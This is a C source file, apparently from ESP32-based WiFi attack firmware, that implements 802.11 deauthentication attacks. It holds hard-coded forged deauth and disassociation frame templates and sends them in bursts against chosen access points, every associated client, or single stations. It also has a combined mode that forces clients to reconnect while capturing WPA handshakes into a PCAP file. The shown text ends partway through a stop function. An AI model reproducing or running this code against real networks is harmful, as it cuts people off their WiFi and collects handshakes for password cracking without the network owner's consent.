/**
 * @file deauth_attack.c
 * @brief Deauthentication attack implementation
 * 
 * This module handles WiFi deauthentication attacks including:
 * - Standard deauth attacks on selected/all APs
 * - Station-specific deauth attacks
 * - Automatic deauth attacks
 * 
 * Note: This module interfaces with wifi_manager.c for shared state
 * and WiFi control functions.
 */

#include "attacks/wifi/deauth_attack.h"
#include "scans/wifi/wpa3_compliance.h"
#include "managers/wifi_manager.h"
#include "core/system_manager.h"
#include "managers/ap_manager.h"
#include "managers/ghostchi_manager.h"
#include "managers/ghostscript_runtime.h"
#include "managers/rgb_manager.h"
#include "managers/status_display_manager.h"
#include "managers/views/terminal_screen.h"
#include "core/callbacks.h"
#include "core/glog.h"
#include "scans/wifi/station_scan.h"
#include "scans/wifi/hop_profile.h"
#include "scans/wifi/wifi_channels.h"
#include "vendor/pcap.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <stdlib.h>

#include "core/network_constants.h"

// Rate limiting
#define MAX_PACKETS_PER_SECOND 500
#define DEAUTH_CHAN_RETRY_DELAY_MS 10
#define DEAUTH_CHAN_ERR_LOG_INTERVAL_MS 5000

// Forward declaration for channel helpers
static esp_err_t deauth_set_channel_robust(int channel);
static void deauth_log_channel_error_throttled(int channel, esp_err_t err);

// External globals from wifi_manager.c (declared in wifi_manager.h)
// These are already declared via the header include above

// RGB manager
extern RGBManager_t rgb_manager;

// Packet counter for rate limiting (local to this module)
static uint32_t packet_counter = 0;
static uint32_t deauth_packets_sent = 0;

// Task handles (local to this module)
static TaskHandle_t deauth_task_handle = NULL;
static TaskHandle_t deauth_station_task_handle = NULL;
static TaskHandle_t handshake_deauth_task_handle = NULL;
static bool deauth_task_running = false;
static volatile bool deauth_stop_requested = false;
static volatile bool deauth_station_stop_requested = false;
static volatile bool handshake_deauth_stop_requested = false;
static bool handshake_deauth_task_running = false;
static uint32_t handshake_deauth_handshake_count = 0;

static station_ap_pair_t selected_station_local;
static bool station_selected_local = false;

static wifi_ap_record_t selected_ap_local;
static wifi_ap_record_t *selected_aps_local = NULL;
static int selected_ap_count_local = 0;

// Rate limiting check (local)
static bool check_packet_rate(void) {
    static uint32_t last_time = 0;
    static uint32_t packets_this_second = 0;
    
    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds
    
    if (current_time - last_time >= 1000) {
        // Reset counter every second
        packets_this_second = 0;
        last_time = current_time;
    }
    
    if (packets_this_second >= MAX_PACKETS_PER_SECOND) {
        return false;
    }
    
    packets_this_second++;
    return true;
}

// Helper to sanitize SSID (local)
static void sanitize_ssid(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
    char temp_ssid[33];
    memcpy(temp_ssid, input_ssid, 32);
    temp_ssid[32] = '\0';
    
    if (strlen(temp_ssid) == 0) {
        snprintf(output_buffer, buffer_size, "[Hidden]");
    } else {
        snprintf(output_buffer, buffer_size, "%s", temp_ssid);
    }
}

// Deauth packet templates
static const uint8_t deauth_packet_template[26] = {
    0xc0, 0x00,                         // Frame Control
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence number
    0x07, 0x00 // Reason code: Class 3 frame received from nonassociated STA
};

static const uint8_t disassoc_packet_template[26] = {
    0xa0, 0x00,                         // Frame Control (only first byte different)
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence number
    0x07, 0x00                          // Reason code
};

// Forward declarations
static void deauth_task(void *param);
static void deauth_station_task(void *param);
static void handshake_deauth_task(void *param);

// --- Channel helpers (fixes #368) ---
// The attack radio profile runs STA-only, so GhostNet clients are already
// gone by the time any attack task runs. This helper just handles transient
// channel-set failures with one quick retry.
static esp_err_t deauth_set_channel_robust(int channel) {
    if (channel < 1 || channel > MAX_WIFI_CHANNEL) return ESP_ERR_INVALID_ARG;
    uint8_t cur_ch = 0;
    wifi_second_chan_t cur_sec = WIFI_SECOND_CHAN_NONE;
    if (esp_wifi_get_channel(&cur_ch, &cur_sec) == ESP_OK && cur_ch == (uint8_t)channel) {
        return ESP_OK; // already on requested channel
    }
    wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
    esp_err_t err = esp_wifi_set_channel(channel, second);
    if (err == ESP_OK) return ESP_OK;
    // Single retry after short delay (handles transient ESP_FAIL)
    vTaskDelay(pdMS_TO_TICKS(DEAUTH_CHAN_RETRY_DELAY_MS));
    return esp_wifi_set_channel(channel, second);
}

static void deauth_log_channel_error_throttled(int channel, esp_err_t err) {
    static uint32_t s_last_ms = 0;
    static int s_last_ch = 0;
    static esp_err_t s_last_err = ESP_OK;
    uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
    if (s_last_ch == channel && s_last_err == err && (now - s_last_ms) < DEAUTH_CHAN_ERR_LOG_INTERVAL_MS) {
        return;
    }
    s_last_ms = now;
    s_last_ch = channel;
    s_last_err = err;
    printf("Failed to set channel %d: %s\n", channel, esp_err_to_name(err));
}

esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6]) {
    esp_err_t err = deauth_set_channel_robust(channel);
    if (err != ESP_OK) {
        deauth_log_channel_error_throttled(channel, err);
        // Don't abort TX: still try to inject on current channel (may still affect co-channel targets)
        // But if channel mismatch, effectiveness will be reduced
    }

    // Create packets from templates
    uint8_t deauth_frame[sizeof(deauth_packet_template)];
    uint8_t disassoc_frame[sizeof(disassoc_packet_template)];
    memcpy(deauth_frame, deauth_packet_template, sizeof(deauth_packet_template));
    memcpy(disassoc_frame, disassoc_packet_template, sizeof(disassoc_packet_template));

    // Check if broadcast MAC
    bool is_broadcast = true;
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0xFF) {
            is_broadcast = false;
            break;
        }
    }

    // Direction 1: AP -> Station
    // Set destination (target)
    memcpy(&deauth_frame[4], mac, 6);
    memcpy(&disassoc_frame[4], mac, 6);

    // Set source and BSSID (AP)
    memcpy(&deauth_frame[10], bssid, 6);
    memcpy(&deauth_frame[16], bssid, 6);
    memcpy(&disassoc_frame[10], bssid, 6);
    memcpy(&disassoc_frame[16], bssid, 6);

    // Add sequence number (random)
    uint16_t seq = (esp_random() & 0xFFF) << 4;
    deauth_frame[22] = seq & 0xFF;
    deauth_frame[23] = (seq >> 8) & 0xFF;
    disassoc_frame[22] = seq & 0xFF;
    disassoc_frame[23] = (seq >> 8) & 0xFF;

    // Send frames (no rate limiting for burst effectiveness)
    esp_err_t tx_err;
    tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), deauth_frame, sizeof(deauth_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;
    tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), deauth_frame, sizeof(deauth_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;
    tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), disassoc_frame, sizeof(disassoc_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;
    tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), disassoc_frame, sizeof(disassoc_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;

    // If not broadcast, send reverse direction
    if (!is_broadcast) {
        // Swap addresses for Station -> AP direction
        memcpy(&deauth_frame[4], bssid, 6);
        memcpy(&deauth_frame[10], mac, 6);
        memcpy(&deauth_frame[16], bssid, 6);

        memcpy(&disassoc_frame[4], bssid, 6);
        memcpy(&disassoc_frame[10], mac, 6);
        memcpy(&disassoc_frame[16], bssid, 6);

        // New sequence number for reverse direction
        seq = (esp_random() & 0xFFF) << 4;
        deauth_frame[22] = seq & 0xFF;
        deauth_frame[23] = (seq >> 8) & 0xFF;
        disassoc_frame[22] = seq & 0xFF;
        disassoc_frame[23] = (seq >> 8) & 0xFF;

        // Send reverse frames
        tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), deauth_frame, sizeof(deauth_frame), false);
        if (tx_err == ESP_OK) deauth_packets_sent++;
        tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), deauth_frame, sizeof(deauth_frame), false);
        if (tx_err == ESP_OK) deauth_packets_sent++;
        tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), disassoc_frame, sizeof(disassoc_frame), false);
        if (tx_err == ESP_OK) deauth_packets_sent++;
        tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), disassoc_frame, sizeof(disassoc_frame), false);
        if (tx_err == ESP_OK) deauth_packets_sent++;
    }

    return ESP_OK;
}

static void deauth_task(void *param) {
    if (ap_count == 0) {
        glog("No access points found\n");
        glog("Please run 'scan -w' first to find targets\n");
        deauth_task_running = false;
        deauth_task_handle = NULL;
        deauth_stop_requested = false;
        vTaskDeleteWithCaps(NULL);
        return;
    }

    wifi_ap_record_t *ap_info = scanned_aps;
    if (ap_info == NULL) {
        glog("Failed to allocate memory for AP info\n");
        deauth_task_running = false;
        deauth_task_handle = NULL;
        deauth_stop_requested = false;
        vTaskDeleteWithCaps(NULL);
        return;
    }

    uint32_t last_log = 0;
    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    while (!deauth_stop_requested) {
        if (selected_ap_count_local > 0 && selected_aps_local != NULL) {
            // Iterate through selected APs directly instead of all channels
            // This ensures each selected AP gets proper time on its channel
            for (int sel_idx = 0; sel_idx < selected_ap_count_local; sel_idx++) {
                for (int i = 0; i < ap_count; i++) {
                    if (memcmp(ap_info[i].bssid, selected_aps_local[sel_idx].bssid, 6) == 0) {
                        int ch = ap_info[i].primary;
                        esp_err_t ch_err = deauth_set_channel_robust(ch);
                        if (ch_err != ESP_OK) {
                            deauth_log_channel_error_throttled(ch, ch_err);
                            // Channel switch failed even after kicking Ghost clients; skip briefly
                            vTaskDelay(pdMS_TO_TICKS(10));
                            continue;
                        }
                        
                        // Burst loop for effectiveness
                        for (int burst = 0; burst < 25; burst++) {
                            deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
                        }
                        for (int j = 0; j < station_count; j++) {
                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                                for (int burst = 0; burst < 25; burst++) {
                                    deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                                }
                            }
                        }
                        vTaskDelay(pdMS_TO_TICKS(5));
                    }
                }
            }
        } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
            for (int i = 0; i < ap_count; i++) {
                if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap_local.ssid) == 0) {
                    int ch = ap_info[i].primary;
                    esp_err_t ch_err = deauth_set_channel_robust(ch);
                    if (ch_err != ESP_OK) {
                        deauth_log_channel_error_throttled(ch, ch_err);
                        vTaskDelay(pdMS_TO_TICKS(10));
                        continue;
                    }
                    for (int burst = 0; burst < 25; burst++) {
                        deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
                    }
                    for (int j = 0; j < station_count; j++) {
                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                            for (int burst = 0; burst < 25; burst++) {
                                deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                            }
                        }
                    }
                    vTaskDelay(pdMS_TO_TICKS(10));
                }
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10));
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log >= 5000) {
            glog("%" PRIu32 " packets/sec\n", deauth_packets_sent/5);
            deauth_packets_sent = 0;
            last_log = now;
        }
    }
    deauth_task_running = false;
    deauth_stop_requested = false;
    deauth_task_handle = NULL;
    vTaskDeleteWithCaps(NULL);
}

void deauth_attack_start(void) {
    if (!deauth_task_running) {
        extern wifi_ap_record_t selected_ap;
        const char *pmf_warning = wpa3_deauth_warning(&selected_ap);
        if (pmf_warning) {
            glog("WARNING: %s\n", pmf_warning);
            TERMINAL_VIEW_ADD_TEXT("WARNING: %s\n", pmf_warning);
        }
        ap_manager_stop_services();
        ghostchi_manager_add_xp(3);

        // Ensure WiFi is fully stopped before configuring
        esp_wifi_stop();
        vTaskDelay(pdMS_TO_TICKS(50));

        // Attack radio profile: STA-only mode (GhostNet AP off, clients
        // kicked) + wide/LR protocols (enables 5GHz TX, frees channel hopping)
        ESP_ERROR_CHECK(ap_manager_apply_attack_radio());
        printf("Restarting Wi-Fi\n");

#ifdef CONFIG_WITH_STATUS_DISPLAY
        status_display_show_attack("Deauth", "starting");
#endif
        
        // Build channel list for broadcast deauth (user hop profile or the
        // country-appropriate default list).
        hop_profile_resolve(wireshark_channels, sizeof(wireshark_channels),
                            &wireshark_channels_count);
        if (wireshark_channels_count == 0) {
            wireshark_channels_count = wifi_channels_build_country_list(
                wireshark_channels, sizeof(wireshark_channels));
        }
        
        // Copy selected AP info from wifi_manager globals
        extern wifi_ap_record_t selected_ap;
        extern wifi_ap_record_t *selected_aps;
        extern int selected_ap_count;
        
        selected_ap_local = selected_ap;
        selected_aps_local = selected_aps;
        selected_ap_count_local = selected_ap_count;
        
        if (selected_ap_count_local > 0 && selected_aps_local != NULL) {
            glog("Starting deauth attack on %d selected APs:\n", selected_ap_count_local);
            
            for (int i = 0; i < selected_ap_count_local; i++) {
                char sanitized_ssid[33];
                sanitize_ssid(selected_aps_local[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
                glog("  [%d] %s (%02X:%02X:%02X:%02X:%02X:%02X)\n", 
                     i, sanitized_ssid,
                     selected_aps_local[i].bssid[0], selected_aps_local[i].bssid[1], selected_aps_local[i].bssid[2],
                     selected_aps_local[i].bssid[3], selected_aps_local[i].bssid[4], selected_aps_local[i].bssid[5]);
#ifdef CONFIG_WITH_STATUS_DISPLAY
                if (i == 0) {
                    status_display_show_attack("Deauth", sanitized_ssid);
                }
#endif
            }
        } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
            char sanitized_ssid[33];
            sanitize_ssid(selected_ap_local.ssid, sanitized_ssid, sizeof(sanitized_ssid));
            glog("Starting deauth attack on selected AP: %s\n", sanitized_ssid);
#ifdef CONFIG_WITH_STATUS_DISPLAY
            status_display_show_attack("Deauth", sanitized_ssid);
#endif
        } else {
            glog("No AP selected. Select a target AP before starting deauth.\n");
            TERMINAL_VIEW_ADD_TEXT("No AP selected. Select a target AP before starting deauth.\n");
#ifdef CONFIG_WITH_STATUS_DISPLAY
            status_display_show_status("No AP Selected");
#endif
            rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
            esp_wifi_stop();
            (void)ap_manager_restore_after_attack("deauth start");
            return;
        }
        
        deauth_stop_requested = false;
        BaseType_t rc = xTaskCreate_psram(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
        if (rc != pdPASS) {
            glog("Failed to start deauth task (%ld)\n", (long)rc);
            status_display_show_status("Deauth Start Fail");
            deauth_task_handle = NULL;
            deauth_stop_requested = false;
            return;
        }
        deauth_task_running = true;
        rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
        char da_payload[16];
        snprintf(da_payload, sizeof(da_payload), "%d", selected_ap_count_local);
        ghostscript_emit_event("attack_started", "deauth");
    } else {
        glog("Deauth already running.\n");
    }
}

void deauth_attack_stop(void) {
    if (deauth_task_running) {
        printf("Stopping deauth transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Stopping deauth transmission...\n");
        status_display_show_status("Deauth Stopping");
        
        deauth_stop_requested = true;
        
        if (deauth_task_handle != NULL) {
            TaskHandle_t handle_to_check = deauth_task_handle;
            int wait_count = 0;
            while (deauth_task_handle != NULL && wait_count < 100) {
                vTaskDelay(pdMS_TO_TICKS(10));
                wait_count++;
            }
            
            if (deauth_task_handle != NULL) {
                glog("Deauth stop timeout; waiting for task to exit cleanly\n");
            }
        }

        deauth_task_running = false;
        deauth_stop_requested = false;
        rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
        esp_wifi_stop();
        (void)ap_manager_restore_after_attack("deauth stop");
        status_display_show_status("Deauth Stopped");
        ghostscript_emit_event("attack_stopped", "deauth");
    } else {
        status_display_show_status("No Deauth Active");
    }
}

void deauth_attack_start_station(void) {
    station_selected_local = station_scan_get_selection(&selected_station_local);
    if (!station_selected_local) {
        glog("No station selected; falling back to AP deauth mode.\n");
        deauth_attack_start();
        return;
    }
    glog("WARNING: PMF posture is not available for the selected station; deauth effectiveness is unverified.\n");
    if (deauth_station_task_handle) {
        printf("Station deauth already running.\n");
        return;
    }
    ap_manager_stop_services(); // stop AP and HTTP server

    // Ensure WiFi is fully stopped before configuring
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    // Attack radio profile: STA-only mode (GhostNet AP off, clients kicked)
    // + wide/LR protocols (enables 5GHz TX, frees channel hopping)
    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());

    glog("Deauthing station %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X, starting background task...\n",
         selected_station_local.station_mac[0], selected_station_local.station_mac[1], selected_station_local.station_mac[2], 
         selected_station_local.station_mac[3], selected_station_local.station_mac[4], selected_station_local.station_mac[5],
         selected_station_local.ap_bssid[0], selected_station_local.ap_bssid[1], selected_station_local.ap_bssid[2], 
         selected_station_local.ap_bssid[3], selected_station_local.ap_bssid[4], selected_station_local.ap_bssid[5]);
    deauth_station_stop_requested = false;
    BaseType_t station_rc = xTaskCreate_psram(deauth_station_task, "deauth_station", 4096, NULL, 5, &deauth_station_task_handle);
    if (station_rc != pdPASS) {
        glog("Failed to start station deauth task (%ld)\n", (long)station_rc);
        status_display_show_status("Deauth Station Fail");
        deauth_station_task_handle = NULL;
        deauth_station_stop_requested = false;
        (void)ap_manager_restore_after_attack("station deauth start");
        return;
    }
    station_selected_local = false;
}

// Background task for deauthenticating a selected station and logging packet rate
static void deauth_station_task(void *param) {
    // Get the channel from the scanned AP that matches the target BSSID
    int deauth_channel = 1;
    for (int i = 0; i < ap_count; i++) {
        if (memcmp(scanned_aps[i].bssid, selected_station_local.ap_bssid, 6) == 0) {
            deauth_channel = scanned_aps[i].primary;
            break;
        }
    }
    
    // Validate channel is within allowed range
    if (deauth_channel < 1 || deauth_channel > MAX_WIFI_CHANNEL) {
        deauth_channel = 1; // fallback channel
    }
    // Initial channel set with retry and throttled error logging
    esp_err_t init_ch_err = deauth_set_channel_robust(deauth_channel);
    if (init_ch_err != ESP_OK) {
        deauth_log_channel_error_throttled(deauth_channel, init_ch_err);
    }
    uint32_t last_log = xTaskGetTickCount() * portTICK_PERIOD_MS;
    while (!deauth_station_stop_requested) {
        esp_err_t ch_err = deauth_set_channel_robust(deauth_channel);
        if (ch_err != ESP_OK) {
            deauth_log_channel_error_throttled(deauth_channel, ch_err);
            vTaskDelay(pdMS_TO_TICKS(50));
        } else {
            for (int burst = 0; burst < 25; burst++) {
                deauth_attack_broadcast(selected_station_local.ap_bssid, deauth_channel, selected_station_local.station_mac);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(20));
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log >= 5000) {
            glog("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
            deauth_packets_sent = 0;
            last_log = now;
        }
    }
    deauth_station_task_handle = NULL;
    vTaskDeleteWithCaps(NULL);
}

bool deauth_attack_stop_station(void) {
    if (deauth_station_task_handle != NULL) {
        deauth_station_stop_requested = true;
        
        int wait_count = 0;
        while (deauth_station_task_handle != NULL && wait_count < 100) {
            vTaskDelay(pdMS_TO_TICKS(10));
            wait_count++;
        }
        
        if (deauth_station_task_handle != NULL) {
            vTaskDeleteWithCaps(deauth_station_task_handle);
            deauth_station_task_handle = NULL;
        }
        deauth_station_stop_requested = false;
        (void)ap_manager_restore_after_attack("station deauth stop");
        return true;
    }
    return false;
}

void deauth_attack_auto(void) {
    deauth_attack_start();
}

uint32_t deauth_attack_get_packets_sent(void) {
    return deauth_packets_sent;
}

void deauth_attack_reset_packet_counter(void) {
    deauth_packets_sent = 0;
}

// Combined handshake capture + deauth attack
static void handshake_deauth_task(void *param) {
    (void)param;

    wifi_ap_record_t *ap_info = scanned_aps;
    if (ap_info == NULL) {
        glog("No AP info available\n");
        handshake_deauth_task_running = false;
        handshake_deauth_task_handle = NULL;
        handshake_deauth_stop_requested = false;
        vTaskDeleteWithCaps(NULL);
        return;
    }

    glog("Sending deauth bursts, listening for handshakes...\n");

    uint32_t last_log = 0;
    uint32_t burst_count = 0;
    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    while (!handshake_deauth_stop_requested) {
        // Phase 1: Send deauth burst on each target
        if (selected_ap_count_local > 0 && selected_aps_local != NULL) {
            for (int sel_idx = 0; sel_idx < selected_ap_count_local; sel_idx++) {
                if (handshake_deauth_stop_requested) break;
                for (int i = 0; i < ap_count; i++) {
                    if (memcmp(ap_info[i].bssid, selected_aps_local[sel_idx].bssid, 6) == 0) {
                        int ch = ap_info[i].primary;
                        esp_err_t ch_err = deauth_set_channel_robust(ch);
                        if (ch_err != ESP_OK) {
                            deauth_log_channel_error_throttled(ch, ch_err);
                            continue;
                        }
                        // Short burst: 10 frames to each target
                        for (int burst = 0; burst < 10; burst++) {
                            deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
                        }
                        for (int j = 0; j < station_count; j++) {
                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                                for (int burst = 0; burst < 10; burst++) {
                                    deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                                }
                            }
                        }
                    }
                }
            }
        } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
            for (int i = 0; i < ap_count; i++) {
                if (handshake_deauth_stop_requested) break;
                if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap_local.ssid) == 0) {
                    int ch = ap_info[i].primary;
                    esp_err_t ch_err = deauth_set_channel_robust(ch);
                    if (ch_err != ESP_OK) {
                        deauth_log_channel_error_throttled(ch, ch_err);
                        continue;
                    }
                    for (int burst = 0; burst < 10; burst++) {
                        deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
                    }
                    for (int j = 0; j < station_count; j++) {
                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                            for (int burst = 0; burst < 10; burst++) {
                                deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                            }
                        }
                    }
                }
            }
        }

        burst_count++;

        // Phase 2: Listen for handshakes (2 second window)
        // During this time the promiscuous callback captures EAPOL frames
        for (int wait = 0; wait < 20 && !handshake_deauth_stop_requested; wait++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }

        // Log stats every 5 bursts (~10 seconds)
        if (burst_count % 5 == 0) {
            glog("%" PRIu32 " bursts | %" PRIu32 " deauth pkts | %" PRIu32 " handshakes\n",
                 burst_count, deauth_packets_sent, wifi_callbacks_get_handshake_count());
            deauth_packets_sent = 0;
        }
    }

    handshake_deauth_handshake_count = wifi_callbacks_get_handshake_count();
    handshake_deauth_task_running = false;
    handshake_deauth_stop_requested = false;
    handshake_deauth_task_handle = NULL;
    vTaskDeleteWithCaps(NULL);
}

void deauth_attack_start_handshake_deauth(void) {
    if (handshake_deauth_task_running) {
        glog("Handshake+Deauth already running.\n");
        return;
    }

    // Check if a station is selected first (like deauth_attack_start_station)
    station_ap_pair_t hs_station;
    bool hs_station_selected = station_scan_get_selection(&hs_station);

    // If no station, check for selected AP
    if (!hs_station_selected) {
        extern wifi_ap_record_t selected_ap;
        extern wifi_ap_record_t *selected_aps;
        extern int selected_ap_count;

        selected_ap_local = selected_ap;
        selected_aps_local = selected_aps;
        selected_ap_count_local = selected_ap_count;

        if (selected_ap_count_local <= 0 && strlen((const char *)selected_ap_local.ssid) == 0) {
            glog("No AP or station selected. Select a target first.\n");
#ifdef CONFIG_WITH_STATUS_DISPLAY
            status_display_show_status("No Target Selected");
#endif
            return;
        }
        const char *pmf_warning = wpa3_deauth_warning(&selected_ap_local);
        if (pmf_warning) glog("WARNING: %s\n", pmf_warning);
    } else {
        glog("WARNING: PMF posture is not available for the selected station; deauth effectiveness is unverified.\n");
    }

    ap_manager_stop_services();
    ghostchi_manager_add_xp(3);

    // Ensure WiFi is fully stopped before configuring
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    // Attack radio profile: STA-only mode (GhostNet AP off, clients kicked)
    // + wide/LR protocols (enables 5GHz TX, frees channel hopping)
    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());
    printf("Restarting Wi-Fi for Handshake+Deauth\n");

    // Enable promiscuous mode for EAPOL capture (on top of AP mode)
    wifi_callbacks_reset_handshake_tracking();
    wifi_callbacks_set_pcap_enabled(true);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(wifi_eapol_scan_callback);

    // Open PCAP file for EAPOL capture
    int pcap_err = pcap_file_open("handshake_deauth", PCAP_CAPTURE_WIFI);
    if (pcap_err != ESP_OK) {
        glog("Warning: PCAP file failed to open, continuing without capture\n");
    } else {
        glog("PCAP capture enabled for handshake recording\n");
    }

    // Build channel list for handshake deauth (user hop profile or the
    // country-appropriate default list).
    hop_profile_resolve(wireshark_channels, sizeof(wireshark_channels),
                        &wireshark_channels_count);
    if (wireshark_channels_count == 0) {
        wireshark_channels_count = wifi_channels_build_country_list(
            wireshark_channels, sizeof(wireshark_channels));
    }

    if (hs_station_selected) {
        char sanitized_ssid[33];
        bool found = false;
        for (int i = 0; i < ap_count; i++) {
            if (memcmp(scanned_aps[i].bssid, hs_station.ap_bssid, 6) == 0) {
                sanitize_ssid(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
                selected_ap_local = scanned_aps[i];
                selected_aps_local = NULL;
                selected_ap_count_local = 0;
                found = true;
                break;
            }
        }
        if (!found) {
            snprintf(sanitized_ssid, sizeof(sanitized_ssid), "%02X:%02X:%02X:%02X:%02X:%02X",
                     hs_station.ap_bssid[0], hs_station.ap_bssid[1], hs_station.ap_bssid[2],
                     hs_station.ap_bssid[3], hs_station.ap_bssid[4], hs_station.ap_bssid[5]);
            memset(&selected_ap_local, 0, sizeof(selected_ap_local));
            memcpy(selected_ap_local.bssid, hs_station.ap_bssid, 6);
            selected_ap_local.primary = 1;
            selected_aps_local = NULL;
            selected_ap_count_local = 0;
        }
        glog("Starting Handshake+Deauth on station (AP: %s)\n", sanitized_ssid);
#ifdef CONFIG_WITH_STATUS_DISPLAY
        status_display_show_attack("HS+Deauth", sanitized_ssid);
#endif
    } else {
        extern wifi_ap_record_t selected_ap;
        extern wifi_ap_record_t *selected_aps;
        extern int selected_ap_count;
        selected_ap_local = selected_ap;
        selected_aps_local = selected_aps;
        selected_ap_count_local = selected_ap_count;

        if (selected_ap_count_local > 0 && selected_aps_local != NULL) {
            glog("Starting Handshake+Deauth on %d APs:\n", selected_ap_count_local);
            for (int i = 0; i < selected_ap_count_local; i++) {
                char sanitized_ssid[33];
                sanitize_ssid(selected_aps_local[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
                glog("  [%d] %s\n", i, sanitized_ssid);
#ifdef CONFIG_WITH_STATUS_DISPLAY
                if (i == 0) status_display_show_attack("HS+Deauth", sanitized_ssid);
#endif
            }
        } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
            char sanitized_ssid[33];
            sanitize_ssid(selected_ap_local.ssid, sanitized_ssid, sizeof(sanitized_ssid));
            glog("Starting Handshake+Deauth on: %s\n", sanitized_ssid);
#ifdef CONFIG_WITH_STATUS_DISPLAY
            status_display_show_attack("HS+Deauth", sanitized_ssid);
#endif
        }
    }

    handshake_deauth_handshake_count = 0;

    if (handshake_deauth_stop_requested) {
        glog("Handshake+Deauth cancelled before start.\n");
        handshake_deauth_stop_requested = false;
        esp_wifi_set_promiscuous(false);
        pcap_file_close();
        esp_wifi_stop();
        (void)ap_manager_restore_after_attack("hs+deauth cancel");
        return;
    }

    BaseType_t rc = xTaskCreate_psram(handshake_deauth_task, "hs_deauth_task", 4096, NULL, 5, &handshake_deauth_task_handle);
    if (rc != pdPASS) {
        glog("Failed to start handshake+deauth task (%ld)\n", (long)rc);
        status_display_show_status("HS+Deauth Fail");
        handshake_deauth_task_handle = NULL;
        handshake_deauth_stop_requested = false;
        esp_wifi_set_promiscuous(false);
        pcap_file_close();
        esp_wifi_stop();
        (void)ap_manager_restore_after_attack("hs+deauth start");
        return;
    }
    handshake_deauth_task_running = true;
    rgb_manager_set_color(&rgb_manager, -1, 255, 128, 0, false);
    ghostscript_emit_event("attack_started", "handshake_deauth");
    glog("Handshake+Deauth running. Use 'stopdeauth' or 'stop' to end.\n");
}

bool deauth_attack_stop_handshake_deauth(void) {
    handshake_deauth_stop_requested = true;

    if (!handshake_deauth_task_running) {
        return false;
    }

    glog("Stopping Handshake+Deauth...\n");
    status_display_show_status("HS+Deauth Stop");

    if (handshake_deauth_task_handle != NULL) {
        int wait_count = 0;
        while (handshake_deauth_task_handle != NULL && wait_count < 100) {
            vTaskDelay(pdMS_TO_TICKS(10));
            wait_count++;
        }

        if (handshake_deauth_task_handle != NULL) {
            glog("Handshake+Deauth stop timeout; waiting for task to exit\n");
        }
